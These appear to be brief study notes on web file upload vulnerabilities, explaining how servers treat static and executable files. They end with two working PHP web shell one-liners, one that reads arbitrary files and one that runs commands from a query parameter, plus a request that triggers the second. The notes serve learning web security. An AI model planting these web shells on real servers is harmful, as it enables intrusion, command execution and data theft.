# File Upload
File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.

			Servers handling requests foor static files
- If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.

- If the file type is executable, such as a PHP file, and the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response

- If the file type is executable, but the server is not configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information.

						Web Shells
 Used to read arbitrary files:
 `<?php echo file_get_contents('/path/to/target/file');?>`
 Enables you to pass arbitrary command via query parameter:
`<?php echo system($_GET['command']); ?>`
`GET /example/exploit.php?command=id HTTP/1.1`
